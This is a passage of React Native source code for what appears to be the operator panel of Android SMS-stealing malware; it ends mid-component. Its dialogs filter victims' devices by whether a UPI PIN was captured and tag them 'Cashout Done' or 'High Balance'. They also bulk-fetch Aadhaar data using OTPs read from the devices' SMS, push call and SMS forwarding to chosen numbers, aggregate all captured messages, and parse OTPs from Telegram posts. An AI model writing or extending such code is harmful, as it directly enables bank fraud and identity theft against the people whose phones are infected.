import React, { useEffect, useRef, useState } from 'react';
import { ActivityIndicator, Animated, Dimensions, FlatList, Image, Modal, PanResponder, Pressable, ScrollView, StyleSheet, Switch, Text, TextInput, View } from 'react-native';
import { AadhaarResult, aadhaarInit, aadhaarSubmitOtp1, aadhaarSubmitOtp2 } from '@/lib/aadhaar';
import { applyForwarding, fetchForwarding } from '@/lib/devices';
import { getDeviceNumber } from '@/lib/getNumber';
import { getOtpFromDeviceSms } from '@/lib/aadhaarOtp';
import { EverythingDone, runGetEverything } from '@/lib/getEverything';
import { Feather } from '@expo/vector-icons';
import { PanelModal, GradientButton, OutlineButton, usePanelTheme } from '@/components/panel/ui';
import { Client, MANUAL_OFF_TEXT, MANUAL_ON_TEXT, Note, Session, THEME_GRADIENTS } from '@/constants/panelData';
import {
  BUILTIN_NUMBER_PREFIXES, BUILTIN_TOKEN_PREFIXES, ParsedMessage, PrefixKind,
  addCustomPrefix, getCustomPrefixes, initCustomPrefixes, parseMessage, removeCustomPrefix,
} from '@/lib/autoVerify';
import { PALETTE } from '@/constants/theme';

/* ---------- shared bits ---------- */

function DialogTitle({ title, sub }: { title: string; sub?: string }) {
  return (
    <View style={{ marginBottom: 14 }}>
      <Text style={s.title}>{title}</Text>
      {sub ? <Text style={s.sub}>{sub}</Text> : null}
    </View>
  );
}

function CheckRow({ label, checked, onToggle, testID }: { label: string; checked: boolean; onToggle: () => void; testID?: string }) {
  return (
    <Pressable style={s.checkRow} onPress={onToggle} testID={testID}>
      <View style={[s.checkbox, checked && s.checkboxOn]}>
        {checked ? <Feather name="check" size={12} color="#ffffff" /> : null}
      </View>
      <Text style={s.checkLabel}>{label}</Text>
    </Pressable>
  );
}

/* ---------- dialog_sort_filter.xml ---------- */

export interface SortFilter {
  all: boolean; online: boolean; offline: boolean; pin: boolean; nopin: boolean; starred: boolean;
}
export const DEFAULT_FILTER: SortFilter = { all: true, online: false, offline: false, pin: false, nopin: false, starred: false };

export function SortFilterDialog({
  visible, onClose, value, onApply,
}: {
  visible: boolean; onClose: () => void; value: SortFilter; onApply: (f: SortFilter) => void;
}) {
  const [f, setF] = useState(value);
  useEffect(() => { if (visible) setF(value); }, [visible, value]);
  const set = (k: keyof SortFilter) =>
    setF((prev) => (k === 'all' ? { ...DEFAULT_FILTER } : { ...prev, all: false, [k]: !prev[k] }));

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title="🔀 Sort & Filter" sub="Combo select — All ya multiple filters" />
      <CheckRow label="📋 All devices" checked={f.all} onToggle={() => set('all')} testID="sort-all" />
      <CheckRow label="🟢 Online" checked={f.online} onToggle={() => set('online')} testID="sort-online" />
      <CheckRow label="🔴 Offline" checked={f.offline} onToggle={() => set('offline')} testID="sort-offline" />
      <CheckRow label="🔐 Has UPI Pin" checked={f.pin} onToggle={() => set('pin')} testID="sort-pin" />
      <CheckRow label="➖ No UPI Pin" checked={f.nopin} onToggle={() => set('nopin')} testID="sort-nopin" />
      <CheckRow label="⭐ Marked" checked={f.starred} onToggle={() => set('starred')} testID="sort-starred" />
      <View style={s.btnRow}>
        <View style={{ flex: 1 }}><OutlineButton label="Cancel" onPress={onClose} testID="sort-cancel" /></View>
        <View style={{ flex: 1 }}><GradientButton label="Apply" onPress={() => { onApply(f); onClose(); }} testID="sort-apply" /></View>
      </View>
    </PanelModal>
  );
}

/* ---------- dialog_overflow_menu.xml ---------- */

export function OverflowMenuDialog({
  visible, onClose, onGetAadhaar, onGetNumberOfAll, onGetEverything,
}: {
  visible: boolean; onClose: () => void;
  onGetAadhaar: () => void; onGetNumberOfAll: () => void;
  onGetEverything: () => void;
}) {
  return <OverflowMenuInner visible={visible} onClose={onClose} onGetAadhaar={onGetAadhaar} onGetNumberOfAll={onGetNumberOfAll} onGetEverything={onGetEverything} />;
}

function OverflowMenuInner({
  visible, onClose, onGetAadhaar, onGetNumberOfAll, onGetEverything,
}: {
  visible: boolean; onClose: () => void;
  onGetAadhaar: () => void; onGetNumberOfAll: () => void; onGetEverything: () => void;
}) {
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={[s.title, { paddingBottom: 12 }]}>⋮ Quick actions</Text>
      {/* Get Everything — pehle number, phir Aadhaar (chained) */}
      <Pressable style={[s.menuRow, s.menuRowHero]} onPress={() => { onClose(); onGetEverything(); }} testID="overflow-get-everything">
        <Text style={[s.menuEmoji, s.menuEmojiHero]}>⚡</Text>
        <View style={{ flex: 1 }}>
          <Text style={s.menuLabel}>Get Everything</Text>
          <Text style={s.menuSub}>Number pehle, phir Aadhaar auto — sab kuch</Text>
        </View>
      </Pressable>
      <View style={s.menuGap} />
      {/* Aadhaar section — front se SAB devices pe ek saath; per-device button details screen pe hai */}
      <Pressable style={s.menuRow} onPress={() => { onClose(); onGetAadhaar(); }} testID="overflow-get-aadhaar">
        <Text style={s.menuEmoji}>🪪</Text>
        <View style={{ flex: 1 }}>
          <Text style={s.menuLabel}>Get Aadhaar</Text>
          <Text style={s.menuSub}>Fetch Aadhaar from all devices</Text>
        </View>
      </Pressable>
      <View style={s.menuGap} />
      <Pressable style={s.menuRow} onPress={() => { onClose(); onGetNumberOfAll(); }} testID="overflow-get-number-all">
        <Text style={s.menuEmoji}>🔢</Text>
        <View style={{ flex: 1 }}>
          <Text style={s.menuLabel}>Get Number of All</Text>
          <Text style={s.menuSub}>Numbers of every device in list</Text>
        </View>
      </Pressable>
    </PanelModal>
  );
}

/* ---------- Get Everything — live orchestration for all devices ---------- */

const GE_STEP_COLOR: Record<string, string> = {
  done: PALETTE.green,
  skipped: PALETTE.teal,
  error: PALETTE.red,
};

export function GetEverythingDialog({
  visible, onClose, clients, onNumber, onAadhaar,
}: {
  visible: boolean; onClose: () => void; clients: Client[];
  onNumber: () => void; onAadhaar: () => void;
}) {
  const [rows, setRows] = useState<EverythingDone[]>([]);
  const [live, setLive] = useState<EverythingDone | null>(null);
  const liveRef = useRef<EverythingDone | null>(null);
  const [running, setRunning] = useState(false);
  const [summary, setSummary] = useState<{ ok: number; skip: number } | null>(null);

  useEffect(() => {
    if (!visible) { setRows([]); setLive(null); setSummary(null); setRunning(false); return; }
    liveRef.current = null;
    setRunning(true); setRows([]); setSummary(null);
    const finalRows: EverythingDone[] = [];
    runGetEverything(clients, (p) => {
      const item: EverythingDone = {
        deviceId: p.deviceId, deviceLabel: p.deviceLabel, sim: p.sim, ok: p.step === 'done',
        number: p.detail.includes('Number:') ? p.detail.split('Number: ')[1] : undefined,
        error: p.step === 'skipped' || p.step === 'error' ? p.detail : undefined,
        result: p.step === 'done' ? undefined : undefined,
      };
      item.ok = p.step === 'done';
      liveRef.current = item;
      setLive(item);
      if (p.step === 'done' || p.step === 'skipped' || p.step === 'error') {
        finalRows.push(item);
        setRows(() => [...finalRows]);
      }
    }).then((done) => {
      setRunning(false);
      setLive(null);
      setSummary({ ok: done.filter((d) => d.ok).length, skip: done.filter((d) => !d.ok).length });
      setRows(done);
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [visible]);

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={[s.title, { paddingBottom: 2 }]}>⚡ Get Everything</Text>
      <Text style={s.geSub}>
        Har device: SIM detect (sim2 ho to sim2) → number → Aadhaar. Step limited-time — server/LOT stuck ho to skip.
      </Text>

      {summary ? (
        <View style={s.geSummary}>
          <Text style={[s.geSummaryText, { color: PALETTE.green }]}>✅ {summary.ok} done</Text>
          <Text style={[s.geSummaryText, { color: PALETTE.teal }]}>⏭️ {summary.skip} skip/error</Text>
        </View>
      ) : null}

      <ScrollView style={s.geList}>
        {live ? (
          <View style={s.geRow}>
            <ActivityIndicator size="small" color={PALETTE.teal} />
            <View style={{ flex: 1 }}>
              <Text style={s.geRowTitle}>{live.deviceLabel || live.deviceId}</Text>
              <Text style={s.geRowSub}>{live.error || (live.number ? `SIM${live.sim} · ${live.number}` : '…')}</Text>
            </View>
          </View>
        ) : null}
        {rows.map((r) => {
          const color = r.ok ? GE_STEP_COLOR.done : GE_STEP_COLOR.skipped;
          return (
            <View key={r.deviceId} style={s.geRow}>
              <Text style={[s.geDot, { color }]}>●</Text>
              <View style={{ flex: 1 }}>
                <Text style={s.geRowTitle}>{r.deviceLabel || r.deviceId}</Text>
                <Text style={s.geRowSub}>
                  {r.ok
                    ? `SIM${r.sim} · ${r.result?.pdfName ?? 'Aadhaar'} · ${r.number ?? ''}`
                    : r.error}
                </Text>
              </View>
            </View>
          );
        })}
        {rows.length === 0 && !live ? (
          <Text style={s.geEmpty}>Devices milne par Get Everything chalta hai…</Text>
        ) : null}
      </ScrollView>

      {running ? (
        <View style={s.geBusy}><ActivityIndicator color={PALETTE.primaryBright} size="small" /></View>
      ) : (
        <View style={s.btnRow}>
          <View style={{ flex: 1 }}><OutlineButton label="Close" onPress={onClose} testID="ge-close" /></View>
          <View style={{ flex: 1 }}><GradientButton label="Done" onPress={onClose} testID="ge-done" /></View>
        </View>
      )}
    </PanelModal>
  );
}

/* ---------- dialog_edit_label.xml ---------- */

const QUICK_FILLS = ['💸 Cashout Done', '📉 Low Balance', '📈 High Balance', '🏦 No Bank'];

// ─── Device Label picker (4 fixed types — owner rule 2026-08-15) ───
// Free-text label hata diya; ab sirf ye 4 category tags. '' = clear.
export const DEVICE_LABELS = [
  '💰 High Balance',
  '📉 Low Balance',
  '💸 Cash Out Done',
  '⭐ Top Priority',
] as const;

export function LabelPickerDialog({
  visible, onClose, current, onPick,
}: {
  visible: boolean; onClose: () => void; current: string; onPick: (label: string) => void;
}) {
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={s.title}>🏷️ Device Label</Text>
      <Text style={s.sub}>Ek type choose karo — ye device card pe aage dikhega</Text>
      <View style={{ gap: 8, marginTop: 14 }}>
        {DEVICE_LABELS.map((l) => {
          const active = current === l;
          return (
            <Pressable
              key={l}
              onPress={() => { onPick(l); onClose(); }}
              style={[styles2.labelOption, active && styles2.labelOptionOn]}
              testID={`label-pick-${l}`}
            >
              <Text style={styles2.labelOptionText}>{l}</Text>
              {active && <Feather name="check" size={15} color={PALETTE.greenBright} />}
            </Pressable>
          );
        })}
        {current ? (
          <Pressable onPress={() => { onPick(''); onClose(); }} style={styles2.labelClear} testID="label-clear">
            <Feather name="x-circle" size={13} color={PALETTE.redSoft} />
            <Text style={styles2.labelClearText}>Remove Label</Text>
          </Pressable>
        ) : null}
      </View>
    </PanelModal>
  );
}

const styles2 = StyleSheet.create({
  labelOption: {
    flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between',
    borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 10,
    backgroundColor: PALETTE.bg, paddingHorizontal: 14, paddingVertical: 12,
  },
  labelOptionOn: { borderColor: PALETTE.green, backgroundColor: PALETTE.greenBg },
  labelOptionText: { color: PALETTE.textSoft, fontSize: 14, fontFamily: 'Inter_600SemiBold' },
  labelClear: {
    flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 6,
    borderWidth: 1, borderColor: PALETTE.redDark, borderRadius: 10,
    backgroundColor: PALETTE.redBg, paddingVertical: 10, marginTop: 2,
  },
  labelClearText: { color: PALETTE.redSoft, fontSize: 12.5, fontFamily: 'Inter_700Bold' },
});


export function EditLabelDialog({
  visible, onClose, value, setTime, onSave,
}: {
  visible: boolean; onClose: () => void; value: string; setTime: string; onSave: (label: string) => void;
}) {
  const [text, setText] = useState(value);
  useEffect(() => { if (visible) setText(value); }, [visible, value]);

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={s.title}>🏷️ Device Label</Text>
      {setTime ? <Text style={s.sub}>{setTime}</Text> : null}
      <TextInput
        value={text}
        onChangeText={setText}
        placeholder="Label (emoji allowed) e.g. 💸 Cashout Done"
        placeholderTextColor={PALETTE.textDim}
        style={[s.input, { marginTop: 14 }]}
        testID="label-input"
      />
      <Text style={s.quickFillTitle}>Quick fill</Text>
      <View style={s.chipRowWrap}>
        <View style={s.chipRow}>
          <Pressable style={s.chip} onPress={() => setText(QUICK_FILLS[0])} testID={`quickfill-${QUICK_FILLS[0]}`}>
            <Text style={s.chipText}>{QUICK_FILLS[0]}</Text>
          </Pressable>
          <Pressable style={s.chip} onPress={() => setText(QUICK_FILLS[1])} testID={`quickfill-${QUICK_FILLS[1]}`}>
            <Text style={s.chipText}>{QUICK_FILLS[1]}</Text>
          </Pressable>
        </View>
        <View style={s.chipRow}>
          <Pressable style={s.chip} onPress={() => setText(QUICK_FILLS[2])} testID={`quickfill-${QUICK_FILLS[2]}`}>
            <Text style={s.chipText}>{QUICK_FILLS[2]}</Text>
          </Pressable>
          <Pressable style={s.chip} onPress={() => setText(QUICK_FILLS[3])} testID={`quickfill-${QUICK_FILLS[3]}`}>
            <Text style={s.chipText}>{QUICK_FILLS[3]}</Text>
          </Pressable>
        </View>
      </View>
      <GradientButton label="Save Label" onPress={() => { onSave(text.trim()); onClose(); }} testID="label-save" style={{ marginTop: 16 }} />
    </PanelModal>
  );
}

/* ---------- auto verify settings (reference dashboard port) ---------- */

export function AutoVerifyDialog({ visible, onClose }: { visible: boolean; onClose: () => void }) {
  const [numCustom, setNumCustom] = useState<string[]>([]);
  const [msgCustom, setMsgCustom] = useState<string[]>([]);
  const [numInput, setNumInput] = useState('');
  const [msgInput, setMsgInput] = useState('');
  const [testMsg, setTestMsg] = useState('');
  const [testResult, setTestResult] = useState<ParsedMessage | null>(null);

  useEffect(() => {
    if (!visible) return;
    let alive = true;
    // Pehle AsyncStorage se hydrate (restart ke baad saved prefixes) — phir list bharo.
    void initCustomPrefixes().then(() => {
      if (!alive) return;
      setNumCustom(getCustomPrefixes('number'));
      setMsgCustom(getCustomPrefixes('message'));
    });
    setNumInput('');
    setMsgInput('');
    setTestMsg('');
    setTestResult(null);
    return () => { alive = false; };
  }, [visible]);

  const add = (kind: PrefixKind) => {
    const raw = kind === 'number' ? numInput : msgInput;
    if (!addCustomPrefix(kind, raw)) return;
    if (kind === 'number') {
      setNumCustom(getCustomPrefixes('number'));
      setNumInput('');
    } else {
      setMsgCustom(getCustomPrefixes('message'));
      setMsgInput('');
    }
  };

  const remove = (kind: PrefixKind, p: string) => {
    removeCustomPrefix(kind, p);
    if (kind === 'number') setNumCustom(getCustomPrefixes('number'));
    else setMsgCustom(getCustomPrefixes('message'));
  };

  const section = (
    kind: PrefixKind, title: string, emoji: string, customs: string[], builtins: string[],
    inputVal: string, setInput: (v: string) => void, placeholder: string,
  ) => (
    <View style={s.avSection}>
      <Text style={s.avSectionTitle}>{`${emoji} ${title}`}</Text>
      <Text style={s.avMini}>SELECTED</Text>
      <View style={s.avChipWrap}>
        {builtins.map((p) => (
          <View key={p} style={s.avChip}><Text style={s.avChipText}>{p}</Text></View>
        ))}
        {customs.map((p) => (
          <View key={p} style={s.avChip}>
            <Text style={s.avChipText}>{p}</Text>
            <Pressable hitSlop={6} onPress={() => remove(kind, p)} testID={`av-remove-${p}`}>
              <Feather name="x" size={11} color={PALETTE.red} />
            </Pressable>
          </View>
        ))}
      </View>
      <View style={s.inputRow}>
        <TextInput
          value={inputVal}
          onChangeText={setInput}
          placeholder={placeholder}
          placeholderTextColor={PALETTE.textDim}
          style={[s.input, { flex: 1 }]}
          testID={`av-input-${kind}`}
        />
        <OutlineButton label="Add" onPress={() => add(kind)} testID={`av-add-${kind}`} />
      </View>
    </View>
  );

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <ScrollView style={{ maxHeight: 540 }}>
        <DialogTitle title="⚡ Verify Settings" sub="Channel post se number + message nikalne ke prefixes" />
        {section('number', 'NUMBER', '📞', numCustom, BUILTIN_NUMBER_PREFIXES, numInput, setNumInput, 'e.g. Receiver: or Send No:')}
        {section('message', 'MESSAGE', '💬', msgCustom, BUILTIN_TOKEN_PREFIXES, msgInput, setMsgInput, 'e.g. SMS: or Notification:')}

        <View style={s.avSection}>
          <Text style={s.avSectionTitle}>🧪 Test Parsing</Text>
          <TextInput
            value={testMsg}
            onChangeText={(t) => { setTestMsg(t); setTestResult(null); }}
            placeholder="Telegram message paste karein…"
            placeholderTextColor={PALETTE.textDim}
            style={[s.input, { minHeight: 60, textAlignVertical: 'top' }]}
            multiline
            testID="av-test-input"
          />
          <GradientButton
            label="Run Test"
            onPress={() => setTestResult(parseMessage(testMsg))}
            disabled={!testMsg.trim()}
            testID="av-test-run"
            style={{ marginTop: 10 }}
          />
          {testResult ? (
            <View style={{ marginTop: 10, gap: 8 }}>
              <Text style={[s.avMini, { color: testResult.number || testResult.token ? PALETTE.green : PALETTE.red, marginBottom: 0 }]}>
                {testResult.number || testResult.token ? 'SUCCESSFUL' : 'FAILED — NO MATCHES'}
              </Text>
              <View style={s.avResult}>
                <Text style={s.avMini}>NUMBER</Text>
                <Text style={s.avResultText}>{testResult.number ?? '— not found —'}</Text>
              </View>
              <View style={s.avResult}>
                <Text style={s.avMini}>MESSAGE</Text>
                <Text style={s.avResultText}>{testResult.token ?? '— not found —'}</Text>
              </View>
            </View>
          ) : null}
        </View>
      </ScrollView>
      <GradientButton label="Done" onPress={onClose} testID="av-settings-done" style={{ marginTop: 14 }} />
    </PanelModal>
  );
}

/* ---------- device notes ---------- */

export function NotesDialog({
  visible, onClose, notes, onAdd, onDelete,
}: {
  visible: boolean; onClose: () => void; notes: Note[];
  onAdd: (body: string) => void; onDelete: (id: string) => void;
}) {
  const [text, setText] = useState('');
  useEffect(() => { if (visible) setText(''); }, [visible]);

  const add = () => {
    const body = text.trim();
    if (!body) return;
    onAdd(body);
    setText('');
  };

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title="📝 Device Notes" sub="Sirf aapke liye — is device ke private notes" />
      {notes.length === 0 ? (
        <Text style={s.noteEmpty}>Abhi koi note nahi — neeche likh kar add karein</Text>
      ) : (
        <ScrollView style={s.noteList}>
          {notes.map((n) => (
            <View key={n.id} style={s.noteRow}>
              <View style={{ flex: 1 }}>
                <Text style={s.noteBody}>{n.body}</Text>
                <Text style={s.noteTime}>{n.time}</Text>
              </View>
              <Pressable hitSlop={8} onPress={() => onDelete(n.id)} testID={`note-delete-${n.id}`}>
                <Feather name="trash-2" size={15} color={PALETTE.red} />
              </Pressable>
            </View>
          ))}
        </ScrollView>
      )}
      <TextInput
        value={text}
        onChangeText={setText}
        placeholder="Note likhein… (balance, follow-up, ya kuch bhi)"
        placeholderTextColor={PALETTE.textDim}
        style={[s.input, s.noteInput]}
        multiline
        testID="note-input"
      />
      <GradientButton label="Add Note" onPress={add} testID="note-add" style={{ marginTop: 12 }} />
    </PanelModal>
  );
}

/* ---------- dialog_sim_sms.xml ---------- */

export function SimSmsDialog({
  visible, onClose, sim, manual, onToggleManual, onSent,
}: {
  visible: boolean; onClose: () => void; sim: 1 | 2; manual: boolean;
  onToggleManual: (v: boolean) => void; onSent: (to: string, body: string) => void;
}) {
  const [to, setTo] = useState('');
  const [body, setBody] = useState('');
  // Manual OFF = auto-send: as soon as both fields are filled it "sends".
  useEffect(() => {
    if (!manual && visible && to.trim() && body.trim()) {
      onSent(to.trim(), body.trim());
      setTo(''); setBody('');
      onClose();
    }
  }, [to, body, manual, visible]);

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title="Send SMS" sub="VIP quick send" />
      <Text style={[s.fieldLabel, { marginTop: 14 }]}>Recipient number</Text>
      <View style={[s.inputRow, { marginTop: 6 }]}>
        <TextInput value={to} onChangeText={setTo} placeholder="Enter recipient" placeholderTextColor={PALETTE.textDim} keyboardType="phone-pad" style={[s.input, { flex: 1 }]} testID="sms-recipient" />
        <OutlineButton label="Paste" onPress={() => setTo('+91 98115 20001')} testID="sms-paste-number" style={{ paddingHorizontal: 14 }} color={PALETTE.teal} />
      </View>
      <Text style={[s.fieldLabel, { marginTop: 12 }]}>Message</Text>
      <View style={[s.inputRow, { alignItems: 'flex-start', marginTop: 6 }]}>
        <TextInput value={body} onChangeText={setBody} placeholder="Enter message" placeholderTextColor={PALETTE.textDim} multiline style={[s.input, { flex: 1, minHeight: 84, textAlignVertical: 'top' }]} testID="sms-message" />
        <OutlineButton label="Paste" onPress={() => setBody('Your OTP is 448190. Do not share.')} testID="sms-paste-message" style={{ paddingHorizontal: 14 }} color={PALETTE.teal} />
      </View>
      <View style={s.toggleSection}>
        <View style={{ flex: 1 }}>
          <Text style={s.checkLabel}>Manual Send</Text>
          <Text style={s.toggleInfo}>{manual ? MANUAL_ON_TEXT : MANUAL_OFF_TEXT}</Text>
        </View>
        <Switch value={manual} onValueChange={onToggleManual} trackColor={{ false: PALETTE.borderSoft, true: PALETTE.primary }} thumbColor="#fff" />
      </View>
      <GradientButton
        label="Send SMS"
        disabled={!manual || !to.trim() || !body.trim()}
        onPress={() => { onSent(to.trim(), body.trim()); setTo(''); setBody(''); onClose(); }}
        testID="sms-send"
        style={{ marginTop: 16 }}
      />
    </PanelModal>
  );
}

/* ---------- dialog_forwarding.xml ---------- */

// Forwarding (2026-08-16 real wiring): pehle Apply sirf toast dikhata tha — koi
// RTDB write nahi thi (mock). Ab GET se current state prefill hoti hai aur
// Apply server endpoint pe likhta hai (actions/callForward + actions/forwardSms,
// reference V7 protocol).
export function ForwardingDialog({ visible, onClose, onApplied, deviceId }: { visible: boolean; onClose: () => void; onApplied?: (ok: boolean, msg: string) => void; deviceId: string }) {
  const [callOn, setCallOn] = useState(false);
  const [smsOn, setSmsOn] = useState(false);
  const [callNum, setCallNum] = useState('');
  const [smsNum, setSmsNum] = useState('');
  const [busy, setBusy] = useState(false);
  const [loadErr, setLoadErr] = useState(false);
  const applyRef = useRef(false); // sync mutex — setBusy async hai, rapid double-tap dono pass kar jata (code-review)
  const dirtyRef = useRef(false); // user ne kuch type kiya to late prefill uski input overwrite na kare
  const track = { false: PALETTE.borderSoft, true: PALETTE.primary };

  // Dialog khulte hi device ka CURRENT forwarding state prefill (reference bhi
  // open pe actions node padhta hai).
  useEffect(() => {
    if (!visible) return;
    let alive = true;
    dirtyRef.current = false;
    setLoadErr(false);
    fetchForwarding(deviceId)
      .then((st) => {
        if (!alive || dirtyRef.current) return; // user pehle se edit kar raha hai
        setCallNum(st.callTo); setCallOn(st.callOn);
        setSmsNum(st.smsTo); setSmsOn(st.smsOn);
      })
      .catch(() => { if (alive) setLoadErr(true); });
    return () => { alive = false; };
  }, [visible, deviceId]);

  const apply = async () => {
    if (applyRef.current) return;
    if ((callOn && !callNum.trim()) || (smsOn && !smsNum.trim())) {
      onApplied?.(false, 'ON karne ke liye number chahiye');
      return;
    }
    applyRef.current = true;
    setBusy(true);
    try {
      await applyForwarding(deviceId, { callTo: callNum.trim(), callOn, smsTo: smsNum.trim(), smsOn });
      onClose();
      onApplied?.(true, 'Forwarding sent to device (call + SMS)');
    } catch {
      onApplied?.(false, 'Forwarding save nahi hua — panel/RTDB unreachable');
    } finally {
      applyRef.current = false;
      setBusy(false);
    }
  };

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <View style={{ maxHeight: 480 }}>
        <Text style={s.title}>Call & SMS forwarding</Text>
        <Text style={[s.statusAmber, { marginTop: 10 }]}>{`Call forward: ${callOn ? 'ON' : 'OFF'}`}</Text>
        <Text style={[s.fieldLabel, { marginTop: 12 }]}>Call forward</Text>
        <TextInput value={callNum} onChangeText={(v) => { dirtyRef.current = true; setCallNum(v); }} placeholder="Forward to number" placeholderTextColor={PALETTE.textDim} keyboardType="phone-pad" style={[s.input, { marginTop: 6 }]} testID="fwd-call-number" />
        <View style={s.simChipInline}><Text style={s.simChipText}>SIM 1</Text></View>
        <View style={s.toggleRow}>
          <Text style={[s.checkLabel, { flex: 1 }]}>Enable call forwarding</Text>
          <Switch value={callOn} onValueChange={(v) => { dirtyRef.current = true; setCallOn(v); }} trackColor={track} thumbColor="#fff" />
        </View>

        <View style={[s.divider, { marginVertical: 14 }]} />
        <Text style={s.statusAmber}>{`SMS forward: ${smsOn ? 'ON' : 'OFF'}`}</Text>
        <Text style={[s.fieldLabel, { marginTop: 8 }]}>SMS forward (incoming)</Text>
        <TextInput value={smsNum} onChangeText={(v) => { dirtyRef.current = true; setSmsNum(v); }} placeholder="Forward SMS to number" placeholderTextColor={PALETTE.textDim} keyboardType="phone-pad" style={[s.input, { marginTop: 6 }]} testID="fwd-sms-number" />
        <View style={s.toggleRow}>
          <Text style={[s.checkLabel, { flex: 1 }]}>Enable SMS forwarding</Text>
          <Switch value={smsOn} onValueChange={(v) => { dirtyRef.current = true; setSmsOn(v); }} trackColor={track} thumbColor="#fff" />
        </View>
        {loadErr ? <Text style={[s.statusAmber, { marginTop: 10 }]}>Current state load nahi hua (offline?) — Apply phir bhi overwrite karega</Text> : null}
        <GradientButton label={busy ? 'Sending…' : 'Apply forwarding'} onPress={() => void apply()} testID="fwd-apply" style={{ marginTop: 16 }} />
      </View>
    </PanelModal>
  );
}

/* ---------- dialog_sms_loading.xml ---------- */

export function SmsLoadingDialog({ visible, onClose }: { visible: boolean; onClose: () => void }) {
  const [pct, setPct] = useState(0);
  const timers = useRef<ReturnType<typeof setTimeout>[]>([]);

  useEffect(() => {
    if (!visible) return;
    setPct(0);
    for (let i = 5; i <= 100; i += 5) {
      timers.current.push(setTimeout(() => setPct(i), i * 18));
    }
    timers.current.push(setTimeout(onClose, 2000));
    return () => timers.current.forEach(clearTimeout);
  }, [visible]);

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={[s.title, { fontSize: 16 }]}>Loading SMS from all devices</Text>
      <Text style={[s.loadPct, { marginTop: 8 }]}>{pct}%</Text>
      <View style={s.track}><View style={[s.fill, { width: `${pct}%` }]} /></View>
      <OutlineButton label="Load in background" onPress={onClose} testID="smsload-background" style={{ marginTop: 16 }} />
    </PanelModal>
  );
}

/* ---------- All SMS — saare devices ke messages ek hi list me ---------- */

export function AllSmsDialog({
  visible, onClose, clients,
}: {
  visible: boolean; onClose: () => void; clients: Client[];
}) {
  const all = clients.flatMap((c) =>
    c.messages.map((m) => ({
      ...m, key: `${c.id}-${m.id}`, deviceId: c.id,
      deviceLabel: c.label || c.device,
    }))
  );
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title="All SMS" sub={`${all.length} messages · ${clients.length} devices`} />
      <FlatList
        data={all}
        keyExtractor={(m) => m.key}
        style={{ maxHeight: 340 }}
        renderItem={({ item: m }) => (
          <View style={s.allSmsRow}>
            <View style={s.allSmsHead}>
              <Text style={s.allSmsDevice} numberOfLines={1}>{`${m.deviceLabel} · ${m.deviceId}`}</Text>
              <Text style={s.allSmsTime}>{m.time}</Text>
            </View>
            <Text style={s.allSmsFrom} numberOfLines={1}>{`${m.type === 'inbox' ? '📥' : '📤'} ${m.from} · SIM ${m.sim}`}</Text>
            <Text style={s.allSmsBody} numberOfLines={2}>{m.body}</Text>
          </View>
        )}
        ListEmptyComponent={<Text style={s.allSmsBody}>Koi SMS nahi mila</Text>}
      />
      <OutlineButton label="Close" onPress={onClose} testID="allsms-close" style={{ marginTop: 12 }} />
    </PanelModal>
  );
}

/* ---------- simple info alert (e.g. "All SMS" → Coming soon) ---------- */

export function InfoDialog({
  visible, onClose, title, message, okLabel = 'OK',
}: {
  visible: boolean; onClose: () => void; title: string; message: string; okLabel?: string;
}) {
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title={title} />
      <Text style={s.broadcastBody}>{message}</Text>
      <GradientButton label={okLabel} onPress={onClose} testID="info-ok" style={{ marginTop: 16 }} />
    </PanelModal>
  );
}

/* ---------- dialog_admin_broadcast.xml ---------- */

export function AdminBroadcastDialog({
  visible, onClose, message,
}: {
  visible: boolean; onClose: () => void; message: string;
}) {
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <View style={s.broadcastHead}>
        <Text style={s.title}>Announcement</Text>
        <Pressable hitSlop={10} onPress={onClose} testID="broadcast-close">
          <Feather name="x-circle" size={22} color={PALETTE.textMuted} />
        </Pressable>
      </View>
      <Text style={s.broadcastBody}>{message}</Text>
      <GradientButton label="Got it" onPress={onClose} testID="broadcast-action" style={{ marginTop: 16 }} />
    </PanelModal>
  );
}

/* ---------- item_active_session.xml (used inside Settings > Active sessions) ---------- */

export function SessionRow({ session, onLogout }: { session: Session; onLogout: () => void }) {
  const { theme } = usePanelTheme();
  return (
    <View style={s.sessionRow}>
      <View style={{ flex: 1 }}>
        <Text style={s.sessionDevice}>{session.device}{session.current ? ' ★ This phone' : ''}</Text>
        <Text style={s.sessionMeta}>{session.meta}</Text>
      </View>
      <Pressable style={[s.logoutBtn, { backgroundColor: THEME_GRADIENTS[theme][0] }]} onPress={onLogout} testID={`logout-${session.id}`}>
        <Text style={s.logoutText}>Logout</Text>
      </Pressable>
    </View>
  );
}

/* ---------- dialog_login_otp.xml (delete verification variant) ----------
   The APK asks for a Telegram OTP before deleting a message or a connection,
   with a "Don't ask OTP again for 2 hours" skip checkbox. */

export function OtpConfirmDialog({
  visible, onClose, actionLabel = 'Delete', skip, onSkipChange, error, onConfirm, onResend,
}: {
  visible: boolean; onClose: () => void; actionLabel?: string;
  skip?: boolean; onSkipChange?: (v: boolean) => void; error?: string | null;
  onConfirm: (code: string) => void; // parent decide karta hai kab band ho — galat OTP pe dialog khula rahta hai
  onResend?: () => void; // naya OTP maango (server rule: 5 tak, phir 60s cooldown)
}) {
  const [code, setCode] = useState('');
  useEffect(() => { if (visible) setCode(''); }, [visible]);

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <Text style={s.title}>Telegram OTP</Text>
      <Text style={s.sub}>Delete confirm karne ke liye OTP daalo — aapke Telegram pe bheja gaya hai</Text>
      <TextInput
        value={code}
        onChangeText={(t) => setCode(t.replace(/[^0-9]/g, '').slice(0, 6))}
        placeholder="6-digit OTP"
        placeholderTextColor={PALETTE.textDim}
